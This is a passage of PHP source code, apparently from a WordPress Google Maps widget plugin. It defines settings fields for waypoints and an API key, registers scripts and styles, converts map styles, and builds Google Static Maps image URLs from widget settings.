									'description' => __( 'Whether or not this is a stop on the route or just a route preference.', 'siteorigin-widgets' )
								)
							)
						),
						'optimize_waypoints' => array(
							'type'        => 'checkbox',
							'label'       => __( 'Optimize waypoints', 'siteorigin-widgets' ),
							'default'     => false,
							'description' => __( 'Allow the Google Maps service to reorder waypoints for the shortest travelling distance.', 'siteorigin-widgets' )
						)
					)
				),
				'api_key_section' => array(
					'type'   => 'section',
					'label'  => __( 'API key', 'siteorigin-widgets' ),
					'hide'   => true,
					'fields' => array(
						'api_key' => array(
							'type'        => 'text',
							'label'       => __( 'API key', 'siteorigin-widgets' ),
							'description' => __( 'Enter your API key if you have one. This enables you to monitor your Google Maps API usage in the Google APIs Console.', 'siteorigin-widgets' ),
							'optional'    => true
						)
					)
				)
			)
		);
	}

	function initialize() {
		$this->register_frontend_scripts(
			array(
				array(
					'sow-google-map',
					siteorigin_widget_get_plugin_dir_url( 'google-map' ) . 'js/js-map' . SOW_BUNDLE_JS_SUFFIX . '.js',
					array( 'jquery' ),
					SOW_BUNDLE_VERSION
				)
			)
		);
		$this->register_frontend_styles(
			array(
				array(
					'sow-google-map',
					siteorigin_widget_get_plugin_dir_url( 'google-map' ) . 'css/style.css',
					array(),
					SOW_BUNDLE_VERSION
				)
			)
		);
	}

	function enqueue_admin_scripts() {
		wp_enqueue_script( 'sow-google-map', siteorigin_widget_get_plugin_dir_url( 'google-map' ) . 'js/js-map-admin' . SOW_BUNDLE_JS_SUFFIX . '.js', array( 'jquery' ), SOW_BUNDLE_VERSION );
	}

	function get_template_name( $instance ) {
		return $instance['settings']['map_type'] == 'static' ? 'static-map' : 'js-map';
	}

	function get_style_name( $instance ) {
		return '';
	}

	function get_template_variables( $instance, $args ) {
		if( empty( $instance ) ) return array();

		$settings = $instance['settings'];

		$mrkr_src = wp_get_attachment_image_src( $instance['markers']['marker_icon'] );

		$styles = $this->get_styles( $instance );

		if ( $settings['map_type'] == 'static' ) {
			$src_url = $this->get_static_image_src( $instance, $settings['width'], $settings['height'], ! empty( $styles ) ? $styles['styles'] : array() );

			return array(
				'src_url' => sow_esc_url( $src_url )
			);
		} else {
			$markers         = $instance['markers'];
			$directions_json = '';
			if ( ! empty( $instance['directions']['origin'] ) && ! empty( $instance['directions']['destination'] ) ) {
				if ( empty( $instance['directions']['waypoints'] ) ) {
					unset( $instance['directions']['waypoints'] );
				}
				$directions_json = json_encode( $this->underscores_to_camel_case( $instance['directions'] ) );
			}

			return array(
				'map_id'   => md5( $instance['map_center'] ),
				'height'   => $settings['height'],
				'map_data' => array(
					'address'           => $instance['map_center'],
					'zoom'              => $settings['zoom'],
					'scroll-zoom'       => $settings['scroll_zoom'],
					'draggable'         => $settings['draggable'],
					'marker-icon'       => ! empty( $mrkr_src ) ? $mrkr_src[0] : '',
					'markers-draggable' => isset( $markers['markers_draggable'] ) ? $markers['markers_draggable'] : '',
					'marker-at-center'  => $markers['marker_at_center'],
					'marker-positions'  => isset( $markers['marker_positions'] ) ? json_encode( $markers['marker_positions'] ) : '',
					'map-name'          => ! empty( $styles ) ? $styles['map_name'] : '',
					'map-styles'        => ! empty( $styles ) ? json_encode( $styles['styles'] ) : '',
					'directions'        => $directions_json,
					'api-key'           => $instance['api_key_section']['api_key']
				)
			);
		}
	}

	private function get_styles( $instance ) {
		$style_config = $instance['styles'];
		switch ( $style_config['style_method'] ) {
			case 'custom':
				if ( empty( $style_config['custom_map_styles'] ) ) {
					return array();
				} else {
					$map_name   = ! empty( $style_config['styled_map_name'] ) ? $style_config['styled_map_name'] : 'Custom Map';
					$map_styles = $style_config['custom_map_styles'];
					$styles     = array();
					foreach ( $map_styles as $style_item ) {
						$map_feature = $style_item['map_feature'];
						unset( $style_item['map_feature'] );
						$element_type = $style_item['element_type'];
						unset( $style_item['element_type'] );

						$stylers = array();
						foreach ( $style_item as $style_name => $style_value ) {
							if ( $style_value !== '' && ! is_null( $style_value ) ) {
								$style_value = $style_value === false ? 'off' : $style_value;
								array_push( $stylers, array( $style_name => $style_value ) );
							}
						}
						$map_feature = str_replace( '_', '.', $map_feature );
						$map_feature = str_replace( '-', '_', $map_feature );
						array_push( $styles, array(
							'featureType' => $map_feature,
							'elementType' => $element_type,
							'stylers'     => $stylers
						) );
					}

					return array( 'map_name' => $map_name, 'styles' => $styles );
				}
			case 'raw_json':
				if ( empty( $style_config['raw_json_map_styles'] ) ) {
					return array();
				} else {
					$map_name      = ! empty( $style_config['styled_map_name'] ) ? $style_config['styled_map_name'] : __( 'Custom Map', 'siteorigin-widgets' );
					$styles_string = $style_config['raw_json_map_styles'];

					return array( 'map_name' => $map_name, 'styles' => json_decode( $styles_string, true ) );
				}
			case 'normal':
			default:
				return array();
		}
	}

	private function get_static_image_src( $instance, $width, $height, $styles ) {
		$src_url = "https://maps.googleapis.com/maps/api/staticmap?";
		$src_url .= "center=" . $instance['map_center'];
		$src_url .= "&zoom=" . $instance['settings']['zoom'];
		$src_url .= "&size=" . $width . "x" . $height;

		if ( ! empty( $instance['api_key_section']['api_key'] ) ) {
			$src_url .= "&key=" . $instance['api_key_section']['api_key'];
		}

		if ( ! empty( $styles ) ) {
			foreach ( $styles as $st ) {
				if ( empty( $st ) || ! isset( $st['stylers'] ) || empty( $st['stylers'] ) ) {
					continue;
				}
				$st_string = '';
				if ( isset ( $st['featureType'] ) ) {
					$st_string .= 'feature:' . $st['featureType'];
				}
				if ( isset ( $st['elementType'] ) ) {
					if ( ! empty( $st_string ) ) {
						$st_string .= "|";
					}
					$st_string .= 'element:' . $st['elementType'];
				}
				foreach ( $st['stylers'] as $style_prop_arr ) {
					foreach ( $style_prop_arr as $prop_name => $prop_val ) {
						if ( ! empty( $st_string ) ) {
							$st_string .= "|";
						}
						if ( $prop_val[0] == "#" ) {
							$prop_val = "0x" . substr( $prop_val, 1 );
						}
						if ( is_bool( $prop_val ) ) {
							$prop_val = $prop_val ? 'true' : 'false';
						}
						$st_string .= $prop_name . ":" . $prop_val;
					}
				}
				$st_string = '&style=' . $st_string;
				$src_url .= $st_string;
			}
		}

		if ( ! empty( $instance['markers'] ) ) {
			$markers    = $instance['markers'];
			$markers_st = '';

			if ( ! empty( $markers['marker_icon'] ) ) {
				$mrkr_src = wp_get_attachment_image_src( $markers['marker_icon'] );
				if ( ! empty( $mrkr_src ) ) {
					$markers_st .= 'icon:' . $mrkr_src[0];
				}
			}

			if ( $markers['marker_at_center'] ) {
				if ( ! empty( $markers_st ) ) {
					$markers_st .= "|";
				}
				$markers_st .= $instance['map_center'];
			}

			if ( ! empty( $markers['marker_positions'] ) ) {
				foreach ( $markers['marker_positions'] as $marker ) {
					if ( ! empty( $markers_st ) ) {
						$markers_st .= "|";
					}
					$markers_st .= urlencode( $marker['place'] );
				}
			}
			$markers_st = '&markers=' . $markers_st;
			$src_url .= $markers_st;
		}

		return $src_url;
	}
}

siteorigin_widget_register( 'google-map', __FILE__ );